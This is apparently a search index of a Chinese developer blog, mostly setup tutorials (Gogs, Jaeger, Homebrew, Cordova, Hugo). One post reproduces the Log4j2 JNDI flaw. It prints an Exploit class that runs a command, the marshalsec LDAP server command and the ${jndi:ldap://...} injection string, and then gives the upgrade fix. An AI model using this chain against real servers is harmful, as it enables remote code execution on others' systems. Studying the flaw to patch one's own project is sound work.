[{"content":"","permalink":"https://naiba.fun/post/security/dvwa%E9%9D%B6%E5%9C%BA%E8%AF%95%E7%82%BC/","summary":"","title":"Dvwa靶场试炼"},{"content":"gogs官网 https://gogs.io/\n1.安装git yum install -y git\n2.下载git,可以去官网下载 wget https://dl.gogs.io/0.13.0/gogs_0.13.0_linux_amd64.tar.gz\n#默认端口3000 nohup ./gogs web \u0026amp;\u0026gt;/dev/null \u0026amp;\n","permalink":"https://naiba.fun/post/linux/centos%E6%90%AD%E5%BB%BAgogs/","summary":"gogs官网 https://gogs.io/ 1.安装git yum install -y git 2.下载git,可以去官网下载 wget https://dl.gogs.io/0.13.0/gogs_0.13.0_linux_amd64.tar.gz #默认端口3000 nohup ./gogs web \u0026amp;\u0026gt;/dev/null \u0026amp;","title":"Centos搭建gogs"},{"content":"环境：\nspring boot:2.6.2\nopentracing-spring-jaeger-cloud-starter:3.2.2\njaeger-client:1.6.0\n\u0026lt;!--jaeager--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.opentracing.contrib\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;opentracing-spring-jaeger-cloud-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.jaegertracing\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jaeger-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.6.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 注意:\nopentracing-spring-jaeger-cloud-starter不支持最新版本的spring-cloud-starter-openfeign。 spring-cloud-starter-openfeign中的LoadBalancerFeignClient被移除了。\n所以我们需要自己创建下,直接复制\npackage org.springframework.cloud.openfeign.ribbon; public class CachingSpringLoadBalancerFactory { } package org.springframework.cloud.openfeign.ribbon; import feign.Client; public class LoadBalancerFeignClient { public LoadBalancerFeignClient(Client delegate, CachingSpringLoadBalancerFactory lbClientFactory, SpringClientFactory clientFactory) { throw new UnsupportedOperationException(); } public Client getDelegate() { throw new UnsupportedOperationException(); } } package org.springframework.cloud.openfeign.ribbon; public class SpringClientFactory { } docker直接部署jaeger\ndocker run -d --name jaeger \\ -e COLLECTOR_ZIPKIN_HOST_PORT=:9411 \\ -p 5775:5775/udp \\ -p 6831:6831/udp \\ -p 6832:6832/udp \\ -p 5778:5778 \\ -p 16686:16686 \\ -p 14250:14250 \\ -p 14268:14268 \\ -p 14269:14269 \\ -p 9411:9411 \\ jaegertracing/all-in-one:1.33 配置jeager的相关参数\nopentracing: jaeger: enabled: true # 启用对接Jaeger（可以不配置，默认true） enable128-bit-traces: true # 使用短TraceID（可以不配置） udp-sender: udp-sender: host: 192.168.5.110 # 配置Jaeger服务器地址 jeager-ui地址: http://localhost:16686\n其他链路追踪对比 如果只需要traceId 可以只需要引入\n\u0026lt;!--链路追踪 start--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-sleuth\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.0.RELEASE\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--链路追踪 end--\u0026gt; 即可获取到\nimport brave.Tracer; @Service public class Breadcrumb { @Autowired private Tracer tracer; public String breadcrumbId() { return tracer.currentSpan().context().traceIdString(); } } ","permalink":"https://naiba.fun/post/tech/9_springboot%E9%93%BE%E8%B7%AF%E8%BF%BD%E8%B8%AAjaeger/","summary":"\u003cp\u003e环境：\u003cbr\u003e\nspring boot:2.6.2\u003cbr\u003e\nopentracing-spring-jaeger-cloud-starter:3.2.2\u003cbr\u003e\njaeger-client:1.6.0\u003c/p\u003e","title":"spring boot集成jaeger实现链路管理"},{"content":"//多线程-非单例 public class Singleton { private static Singleton INSTANCE; public static Singleton getInstance() { if (isNull(INSTANCE)) { try { Thread.sleep(1); INSTANCE = new Singleton(); } catch (InterruptedException e) { e.printStackTrace(); } } return INSTANCE; } public static void main(String[] args) { for (int i = 0; i \u0026lt; 10; i++) { new Thread(() -\u0026gt; System.out.println(Singleton.getInstance().hashCode())).start(); } } } ","permalink":"https://naiba.fun/post/tech/singleton/","summary":"//多线程-非单例 public class Singleton { private static Singleton INSTANCE; public static Singleton getInstance() { if (isNull(INSTANCE)) { try { Thread.sleep(1); INSTANCE = new Singleton(); } catch (InterruptedException e) { e.printStackTrace(); } } return INSTANCE; } public static void main(String[] args) { for (int i = 0; i \u0026lt; 10; i++) { new Thread(() -\u0026gt; System.out.println(Singleton.getInstance().hashCode())).start(); } } }","title":"Singleton单例"},{"content":"模板：切记不要加/ 否则methodParameter方法获取不到值\n参考配置 ：https://blog.csdn.net/xiaoliulang0324/article/details/79030752\n入参 groovyScript( \u0026#34;if(\\\u0026#34;${_1}\\\u0026#34;.length() == 2) { return \u0026#39; * @param: null\u0026#39;; } else { def result=\u0026#39;\u0026#39;; def params=\\\u0026#34;${_1}\\\u0026#34;.replaceAll(\u0026#39;[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]\u0026#39;, \u0026#39;\u0026#39;).split(\u0026#39;,\u0026#39;).toList(); for(i = 0; i \u0026lt; params.size(); i++) { if(params[i] == \u0026#39;\u0026#39; || params[i] == \u0026#39;null\u0026#39;) { return \u0026#39; * @param: null\u0026#39;; }else{ result+=\u0026#39; * @param: \u0026#39; + params[i] + \u0026#39;--\u0026gt;\u0026#39; }; if(i+1\u0026lt;params.size()){ result+=\u0026#39;\\\\n\u0026#39;; }; }; return result; }\u0026#34;, methodParameters() ); 返回参数 groovyScript(\u0026#34;return \\\u0026#34;${_1}\\\u0026#34; == \u0026#39;void\u0026#39; ? \u0026#39;null\u0026#39; : \u0026#39;\u0026#39; + \\\u0026#34;${_1}\\\u0026#34;\u0026#34;, methodReturnType()) ","permalink":"https://naiba.fun/post/tips/idea-annotation/","summary":"","title":"Idea Annotation"},{"content":"下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。 3.影响范围 Apache Log4j 2.x \u0026lt;= 2.15.0-rc1 4.流程图 图片中用rmi方式,我是用的ldap。 重现漏洞 1.环境版本 JDK：1.8.0_241 Maven：3.6.3 log4j2：2.14.1 2.代码实现 按照流程图标识顺序开始编写代码 第一步、完成恶意代码的编写,部署到服务器上 public class Exploit { public Exploit() { try { System.out.println(\u0026#34;进来了！进来了！\u0026#34;); // 要执行的命令 打开计算器 // mac String[] commands = {\u0026#34;open\u0026#34;, \u0026#34;/System/Applications/Calculator.app\u0026#34;}; //windows // Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); Process pc = Runtime.getRuntime().exec(commands); pc.waitFor(); } catch (Exception e) { e.printStackTrace(); } } public static void main(String[] argv) { Exploit e = new Exploit(); } } 编译 Exploit.java 测试脚本 执行java Exploit 确保能成功打开计算器\n#进入Exploit.class所在目录,执行命令启动一个web服务 python3 -m http.server 8100 直接访问 http://127.0.0.1:8100/ 确保点击能把class下载下来\n第二部、搭建一个LDAP服务 这里会用到marshalsec反序列化工具 我已经打包好可以直接点击下载使用\n或者直接github上下载源码https://github.com/mbechler/marshalsec\n#进入marshalsec 然后执行打包命令 mvn clean package -DskipTests #执行命令启动服务 ldap默认端口是1389 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;http://127.0.0.1:8100/#Exploit\u0026#34; 第三部、编写含有log4j2的error输出接口(即被攻击者的接口，其实就是我们自己项目中含有error输出的接口) 这里我就直接在项目里面输出error日志了\npublic static void main(String[] args){ Logger logger = LogManager.getLogger(ExploitTest.class); // 根据自己版本，觉得是否取消注释下面这行代码, //因为JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 // 那么是不是升级jdk版本就能避免这个问题了呢，其实不然，有其他方式可以绕过高版本JKD，进行注入攻击 // 这里演示的是最基础的方式，所以需要先把变量设为true， //System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); logger.error(\u0026#34;${jndi:ldap://127.0.0.1:1389/test}\u0026#34;); } 如果提示这个错误，也是需要设置System.setProperty(\u0026ldquo;com.sun.jndi.ldap.object.trustURLCodebase\u0026rdquo;,\u0026ldquo;true\u0026rdquo;)的 那么现在执行这个main方式是不是会打开计算器了，成功被注入\n修复 根据官方提示升级即可 Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later). 如果是springboot 第一种最简单的方式，就是在pom中指定版本号\n\u0026lt;properties\u0026gt; \u0026lt;log4j2.version\u0026gt;2.17.0\u0026lt;/log4j2.version\u0026gt; \u0026lt;/properties\u0026gt; ReImpot后应该能看到已经升级到了2.17.0了 第二种就是直接引入对应的jar包\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.17.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-slf4j-impl\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.17.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.17.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-jul\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.17.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ","permalink":"https://naiba.fun/post/security/log4j2_cve-2021-44228-02/","summary":"下面会分四步介绍 概述 1.目的 模拟攻击自有项目，了解原理，修复漏洞 2.漏洞概述 该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未","title":"Apache Log4j2 Jndi RCE 高危漏洞重现/修复"},{"content":"简介 Homebrew 是一款自由及开放源代码的软件包管理系统，用以简化 macOS 和 linux 系统上的软件安装过程。 它拥有安装、卸载、更新、查看、搜索等很多实用的功能，通过简单的一条指令，就可以实现包管理，十分方便快捷。\nHomebrew 主要有四个部分组成: brew、homebrew-core 、homebrew-bottles、homebrew-cask。\n名称 说明 brew Homebrew 源代码仓库 homebrew-core Homebrew 核心软件仓库 homebrew-bottles Homebrew 预编译二进制软件包 homebrew-cask 提供 macOS 应用和大型二进制文件 替换为阿里源\n查看brew.git当前源 cd \u0026#34;$(brew --repo)\u0026#34; \u0026amp;\u0026amp; git remote -v origin https://github.com/Homebrew/brew.git (fetch) origin https://github.com/Homebrew/brew.git (push) 查看homebrew-core.git当前源 cd \u0026#34;$(brew --repo homebrew/core)\u0026#34; \u0026amp;\u0026amp; git remote -v origin https://github.com/Homebrew/homebrew-core.git (fetch) origin https://github.com/Homebrew/homebrew-core.git (push) 修改brew.git为阿里源 $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin https://mirrors.aliyun.com/homebrew/brew.git 修改homebrew-core.git为阿里源 $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin https://mirrors.aliyun.com/homebrew/homebrew-core.git zsh替换brew bintray镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc $ source ~/.zshrc bash替换 brew bintray镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.aliyun.com/homebrew/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile $ source ~/.bash_profile 刷新源 $ brew update 替换为清华源\n替换各个源 $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote set-url origin https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask.git zsh 替换brew bintray镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc $ source ~/.zshrc bash 替换brew bintray镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile $ source ~/.bash_profile 刷新源 $ brew update 替换为中科大源\n替换各个源 $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin https://mirrors.ustc.edu.cn/brew.git $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git zsh 替换 brew bintray 镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc $ source ~/.zshrc bash 替换 brew bintray 镜像 $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile $ source ~/.bash_profile 刷新源 $ brew update 重置为官方源\n重置 brew.git 为官方源 $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin https://github.com/Homebrew/brew.git 重置 homebrew-core.git 为官方源 $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin https://github.com/Homebrew/homebrew-core.git 重置 homebrew-cask.git 为官方源 $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote set-url origin https://github.com/Homebrew/homebrew-cask zsh 注释掉 HOMEBREW_BOTTLE_DOMAIN 配置 $ vi ~/.zshrc [//] export HOMEBREW_BOTTLE_DOMAIN=xxxxxxxxx bash 注释掉 HOMEBREW_BOTTLE_DOMAIN 配置 $ vi ~/.bash_profile [//] export HOMEBREW_BOTTLE_DOMAIN=xxxxxxxxx 刷新源 $ brew update ","permalink":"https://naiba.fun/post/mac/brew/","summary":"简介 Homebrew 是一款自由及开放源代码的软件包管理系统，用以简化 macOS 和 linux 系统上的软件安装过程。 它拥有安装、卸载、更新、查看、搜索等很多实用的功能，通过简","title":"Brew安装"},{"content":"1.安装 npm cordova npm install -g cordova 全局安装Cordova，可以通过cordova -v 来判断是否成功\n2.创建cordova项目 cordova create androidTest io.cordova.hellocordova CordovaApp androidTest 是创建应用程序的目录名称。 io.cordova.hellocordova 是默认的反向域值。 如果可能，您应该使用您自己的域值。 CordovaApp 是您应用的标题。\ncom.mt.crm.app 名淘教育CRM\n3.添加android平台 cd androidTest cordova platform add android \u0026ndash;save\n4.检查构建app的条件 cordova requirements\n如果都提示 installed 则环境没问题 可以构建App了 5.在模拟器上运行 cordova emulate android\n6.编译vue项目把dist下的拷贝到www目录下\n如果要调试 其他命令及意思 cordova install android //将编译好的应用程序安装到模拟器上。 cordova emulate android //在模拟器上运行（前提是创建好AVD） cordova serve android //在浏览器运行 cordova build android //打包cordova项目到android平台。 cordova run android //通过USB直接安装到真机（该语句已经包括了build命令）\nhttp://cordova.axuer.com/docs/zh-cn/latest/guide/cli/index.html\n","permalink":"https://naiba.fun/post/tech/mcordova_vue_android/","summary":"1.安装 npm cordova npm install -g cordova 全局安装Cordova，可以通过cordova -v 来判断是否成功 2.创建cordova项目 cordova create androidTest io.cordova.hellocordova CordovaApp androidTest 是创建应用程序的目录","title":"cordova把vue项目打包成android"},{"content":"提示：教程默认你已经安装了 git,hugo 安装参考官网：\ngit地址：https://git-scm.com/book/zh/v2/起步-安装-Git-Git\nhugo地址：https://gohugo.io/getting-started/installing/\nmac用户可以使用Homebrew安装\nbrew install git: brew install hugo 下面会分四步介绍 一.配置github 1.注册账号 GitHub地址：https://github.com/\n2.新建博客发布仓库\n这里建议新建2个仓库，和fork一个主题\n一个是用于发布我们博文用的仓库，一个是我们存放源码仓库，fork的主题是方便以后修改样式(可做可不做)\n新建 uunao.github.io\nhttps://github.com/uunao/uunao.github.io.git\nSettings \u0026ndash;\u0026gt;GitHub Pages\n3.新建博客源代码 myblog https://github.com/uunao/myblog.git\n4.fork我们相中的主题到本地，方便以后自己修改 这个我的博客模板，用的飞雪无情的：https://github.com/uunao/maupassant-hugo.git\n也可以到官网或者网上搜索大神们写的主题，保存到自己的github上。\nhugo主题地址：https://themes.gohugo.io/\n二.配置本地 1.新建站点\nhugo new site myblog 2.新建博客目录\ncd myblog 3.初花git\ngit init 4.clone 主题为子模块\ngit submodule add https://github.com/uunao/maupassant-hugo.git themes/maupassant 5.复制主题配置文件\ncp themes/maupassant/exampleSite/config.toml . 6.编辑配置文件\nvim config.toml baseURL = \u0026#34;uunao.github.io\u0026#34; #我们申请的github发布仓库地址 languageCode = \u0026#34;zh-CN\u0026#34; title = \u0026#34;小九的博客\u0026#34; #博客的名字 theme = \u0026#34;maupassant\u0026#34; #主题名称 -无需修改 三.发布 1.预览效果\nhugo server http://localhost:1313\n2.发布博文\n把博客仓库已子模块的形式添加到public下\ngit submodule add https://github.com/uunao/uunao.github.io.git public\n执行 hugo 命令\n默认会在public下生成很多编译好的文件\ngit add * git commit -m \u0026#34;init\u0026#34; git push 3.最后把源码提交到myblog仓库备份\ncd myblog git remote add origin https://github.com/uunao/blog.git git add . git commint -m \u0026#34;init\u0026#34; #init 是每次提交的备注，可自定义 git checkout main git branch --set-upstream-to=origin/main main 四.写文章并发布 1.新增博文 \u0026ndash;默认会生成到content目录下面 (如果报错就cd到上级目录)\nhugo new content/post/my-first-blog.md\n2.编辑文件，把草稿状态改成false。文章才能显示\nvim content/post/my-first-blog.md title: \u0026#34;My First Blog\u0026#34; date: 2021-04-21T14:28:08+08:00 draft: false #需要改成false 3.预览效果 hugo server\n4.生成最终需要发布的页面 hugo\n5.提交到博客仓库\ncd public #进入myblo/public目录下 git add . git commit -m \u0026#34;my first blog\u0026#34; git push 6.提交源码到源码仓库\ncd .. #定位到myblog目录下 git add . git commit -m \u0026#34;my first blog\u0026#34; git push 五.git提交异常 git push 根据提示执行,如果又报如下图错误 git push --set-upstream origin main 先执行 git pull --rebase origin master #远程库中的更新合并到本地库中,然后在把刚刚提交的合并在一起 再执行上面的命令就不报错了 git push --set-upstream origin main #把本地分支合并到main上 ","permalink":"https://naiba.fun/post/firstblog/","summary":"提示：教程默认你已经安装了 git,hugo 安装参考官网： git地址：https://git-scm.com/book/zh/v2/起步-安装-Git-Gi","title":"github上创建自己的博客"},{"content":"这家伙很慢什么也没有留下!\n","permalink":"https://naiba.fun/about/","summary":"这家伙很慢什么也没有留下!","title":"关于"}]